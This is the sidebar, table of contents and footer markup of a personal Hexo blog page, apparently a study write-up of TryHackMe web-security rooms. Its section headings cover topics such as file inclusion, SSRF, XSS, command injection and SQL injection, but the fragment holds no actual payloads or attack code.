class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Walking-An-Application"><span class="toc-number">1.</span> <span class="toc-text">Walking An Application</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Viewing-The-Page-Source"><span class="toc-number">1.1.</span> <span class="toc-text">Viewing The Page Source</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Developer-Tools-Inspector"><span class="toc-number">1.2.</span> <span class="toc-text">Developer Tools - Inspector</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Developer-Tools-Debugger"><span class="toc-number">1.3.</span> <span class="toc-text">Developer Tools - Debugger</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Developer-Tools-Network"><span class="toc-number">1.4.</span> <span class="toc-text">Developer Tools - Network</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Content-Discovery"><span class="toc-number">2.</span> <span class="toc-text">Content Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Manual-Discovery-Robots-txt"><span class="toc-number">2.1.</span> <span class="toc-text">Manual Discovery - Robots.txt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Manual-Discovery-Favicon"><span class="toc-number">2.2.</span> <span class="toc-text">Manual Discovery - Favicon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Manual-Discovery-Sitemap-xml"><span class="toc-number">2.3.</span> <span class="toc-text">Manual Discovery - Sitemap.xml</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Manual-Discovery-HTTP-Headers"><span class="toc-number">2.4.</span> <span class="toc-text">Manual Discovery - HTTP Headers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Manual-Discovery-Framework-Stack"><span class="toc-number">2.5.</span> <span class="toc-text">Manual Discovery - Framework Stack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT-Google-Hacking-Dorking"><span class="toc-number">2.6.</span> <span class="toc-text">OSINT - Google Hacking &#x2F; Dorking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT-Wappalyzer"><span class="toc-number">2.7.</span> <span class="toc-text">OSINT - Wappalyzer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT-Wayback-Machine"><span class="toc-number">2.8.</span> <span class="toc-text">OSINT - Wayback Machine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT-GitHub"><span class="toc-number">2.9.</span> <span class="toc-text">OSINT - GitHub</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT-S3-Buckets"><span class="toc-number">2.10.</span> <span class="toc-text">OSINT - S3 Buckets</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Automated-Discovery"><span class="toc-number">2.11.</span> <span class="toc-text">Automated Discovery</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Subdomain-Enumeration"><span class="toc-number">3.</span> <span class="toc-text">Subdomain Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT-SSL-TLS-Certificates"><span class="toc-number">3.1.</span> <span class="toc-text">OSINT - SSL&#x2F;TLS Certificates</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT-Search-Engines"><span class="toc-number">3.2.</span> <span class="toc-text">OSINT - Search Engines</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS-Bruteforce"><span class="toc-number">3.3.</span> <span class="toc-text">DNS Bruteforce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT-Sublist3r"><span class="toc-number">3.4.</span> <span class="toc-text">OSINT - Sublist3r</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Virtual-Hosts"><span class="toc-number">3.5.</span> <span class="toc-text">Virtual Hosts</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Authentication-Bypass"><span class="toc-number">4.</span> <span class="toc-text">Authentication Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Username-Enumeration"><span class="toc-number">4.1.</span> <span class="toc-text">Username Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Brute-Force"><span class="toc-number">4.2.</span> <span class="toc-text">Brute Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Logic-Flaw"><span class="toc-number">4.3.</span> <span class="toc-text">Logic Flaw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie-Tampering"><span class="toc-number">4.4.</span> <span class="toc-text">Cookie Tampering</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IDOR"><span class="toc-number">5.</span> <span class="toc-text">IDOR</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#An-IDOR-Example"><span class="toc-number">5.1.</span> <span class="toc-text">An IDOR Example</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-Include"><span class="toc-number">6.</span> <span class="toc-text">File Include</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#introduction"><span class="toc-number">6.1.</span> <span class="toc-text">introduction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-File-inclusion"><span class="toc-number">6.1.1.</span> <span class="toc-text">What is File inclusion?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Why-do-File-inclusion-vulnerabilities-happen"><span class="toc-number">6.1.2.</span> <span class="toc-text">Why do File inclusion vulnerabilities happen?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-the-risk-of-File-inclusion"><span class="toc-number">6.1.3.</span> <span class="toc-text">What is the risk of File inclusion?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Path-Traversal"><span class="toc-number">6.2.</span> <span class="toc-text">Path Traversal</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Local-File-Inclusion-LFI"><span class="toc-number">6.3.</span> <span class="toc-text">Local File Inclusion - LFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Local-File-Inclusion-LFI-2"><span class="toc-number">6.4.</span> <span class="toc-text">Local File Inclusion - LFI #2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lab3"><span class="toc-number">6.4.1.</span> <span class="toc-text">lab3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lab4"><span class="toc-number">6.4.2.</span> <span class="toc-text">lab4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lab5"><span class="toc-number">6.4.3.</span> <span class="toc-text">lab5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lab6"><span class="toc-number">6.4.4.</span> <span class="toc-text">lab6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remote-File-Inclusion-RFI"><span class="toc-number">6.5.</span> <span class="toc-text">Remote File Inclusion - RFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remediation"><span class="toc-number">6.6.</span> <span class="toc-text">Remediation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge"><span class="toc-number">6.7.</span> <span class="toc-text">Challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge-1"><span class="toc-number">6.7.1.</span> <span class="toc-text">challenge 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#change2"><span class="toc-number">6.7.2.</span> <span class="toc-text">change2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#change3"><span class="toc-number">6.7.3.</span> <span class="toc-text">change3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#change4"><span class="toc-number">6.7.4.</span> <span class="toc-text">change4</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Intro-to-SSRF"><span class="toc-number">7.</span> <span class="toc-text">Intro to SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-an-SSRF"><span class="toc-number">7.1.</span> <span class="toc-text">What is an SSRF?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">7.1.1.</span> <span class="toc-text">What is an SSRF?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">7.1.2.</span> <span class="toc-text">Types of SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">7.1.3.</span> <span class="toc-text">What&#39;s the impact?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Finding-an-SSRF"><span class="toc-number">7.2.</span> <span class="toc-text">Finding an SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Defeating-Common-SSRF-Defenses"><span class="toc-number">7.3.</span> <span class="toc-text">Defeating Common SSRF Defenses</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">7.3.1.</span> <span class="toc-text">Deny List</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Allow-List"><span class="toc-number">7.3.2.</span> <span class="toc-text">Allow List</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">7.3.3.</span> <span class="toc-text">Open Redirect</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-Practical"><span class="toc-number">7.4.</span> <span class="toc-text">SSRF Practical</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Intro-to-Cross-site-Scripting"><span class="toc-number">8.</span> <span class="toc-text">Intro to Cross-site Scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-Payloads"><span class="toc-number">8.1.</span> <span class="toc-text">XSS Payloads</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.1.1.</span> <span class="toc-text">Proof Of Concept:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.1.2.</span> <span class="toc-text">Session Stealing:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.1.3.</span> <span class="toc-text">Key Logger:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.1.4.</span> <span class="toc-text">Business Logic:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reflected-XSS"><span class="toc-number">8.2.</span> <span class="toc-text">Reflected XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.2.1.</span> <span class="toc-text">Potential Impact</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.2.2.</span> <span class="toc-text">How to test for Reflected XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stored-XSS"><span class="toc-number">8.3.</span> <span class="toc-text">Stored XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.3.1.</span> <span class="toc-text">Potential Impact:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.3.2.</span> <span class="toc-text">How to test for Stored XSS:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM-Based-XSS"><span class="toc-number">8.4.</span> <span class="toc-text">DOM Based XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.4.1.</span> <span class="toc-text">What is the DOM?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.4.2.</span> <span class="toc-text">Exploiting the DOM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.4.3.</span> <span class="toc-text">Example Scenario</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.4.4.</span> <span class="toc-text">How to test for Dom Based XSS:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-XSS"><span class="toc-number">8.5.</span> <span class="toc-text">Blind XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.5.1.</span> <span class="toc-text">Example Scenario:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.5.2.</span> <span class="toc-text">Potential Impact:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.5.3.</span> <span class="toc-text">How to test for Blind XSS:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perfecting-your-payload"><span class="toc-number">8.6.</span> <span class="toc-text">Perfecting your payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level-1"><span class="toc-number">8.6.1.</span> <span class="toc-text">level 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-2"><span class="toc-number">8.6.2.</span> <span class="toc-text">level 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-3"><span class="toc-number">8.6.3.</span> <span class="toc-text">level 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-4"><span class="toc-number">8.6.4.</span> <span class="toc-text">level 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-5"><span class="toc-number">8.6.5.</span> <span class="toc-text">level 5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-6"><span class="toc-number">8.6.6.</span> <span class="toc-text">level 6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Practical-Example-Blind-XSS"><span class="toc-number">8.7.</span> <span class="toc-text">Practical Example (Blind XSS)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Command-Injection"><span class="toc-number">9.</span> <span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">9.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Discovering-Command-Injection"><span class="toc-number">9.2.</span> <span class="toc-text">Discovering Command Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-Command-Injection"><span class="toc-number">9.3.</span> <span class="toc-text">Exploiting Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Detecting-Blind-Command-Injection"><span class="toc-number">9.3.1.</span> <span class="toc-text">Detecting Blind Command Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Detecting-Verbose-Command-Injection"><span class="toc-number">9.3.2.</span> <span class="toc-text">Detecting Verbose Command Injection</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remediating-Command-Injection"><span class="toc-number">9.4.</span> <span class="toc-text">Remediating Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">9.4.1.</span> <span class="toc-text">sanitisation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypassing-Filters"><span class="toc-number">9.4.2.</span> <span class="toc-text">Bypassing Filters</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Practical-Command-Injection-Deploy"><span class="toc-number">9.5.</span> <span class="toc-text">Practical: Command Injection (Deploy)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">10.</span> <span class="toc-text">SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#In-Band-SQLi"><span class="toc-number">10.1.</span> <span class="toc-text">In-Band SQLi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#In-Band-SQLi-1"><span class="toc-number">10.1.1.</span> <span class="toc-text">In-Band SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">10.1.2.</span> <span class="toc-text">Error-Based SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">10.1.3.</span> <span class="toc-text">Union-Based SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#In-Band-SQLi-2"><span class="toc-number">10.1.4.</span> <span class="toc-text">In-Band SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blind-SQLi"><span class="toc-number">10.1.5.</span> <span class="toc-text">Blind SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">10.1.6.</span> <span class="toc-text">Authentication Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blind-SQLi-Boolean-Based"><span class="toc-number">10.1.7.</span> <span class="toc-text">Blind SQLi-Boolean Based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blind-SQLi-Time-Based"><span class="toc-number">10.1.8.</span> <span class="toc-text">Blind SQLi - Time Based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Out-of-Band-SQLi"><span class="toc-number">10.1.9.</span> <span class="toc-text">Out-of-Band SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Remediation-1"><span class="toc-number">10.1.10.</span> <span class="toc-text">Remediation</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/12/application/" title="[THM] Walking An Application">[THM] Walking An Application</a><time datetime="2024-04-12T06:31:02.000Z" title="发表于 2024-04-12 14:31:02">2024-04-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/11/%5BTHM%5D%20Intro%20to%20Cyber%20Security/" title="[THM] Intro to Cyber Security">[THM] Intro to Cyber Security</a><time datetime="2024-04-11T04:10:40.000Z" title="发表于 2024-04-11 12:10:40">2024-04-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/30/Xenny%E7%9A%84RSA%E9%A2%98%E5%8D%95/" title="[Xenny的RSA题单]">[Xenny的RSA题单]</a><time datetime="2024-03-30T08:14:42.000Z" title="发表于 2024-03-30 16:14:42">2024-03-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/29/flask-ssti/" title="[flask-ssti参考手册]">[flask-ssti参考手册]</a><time datetime="2024-03-29T08:05:08.000Z" title="发表于 2024-03-29 16:05:08">2024-03-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/24/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/" title="反序列化常见姿势">反序列化常见姿势</a><time datetime="2024-03-24T03:11:21.000Z" title="发表于 2024-03-24 11:11:21">2024-03-24</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/background.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By cl1mb3r</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
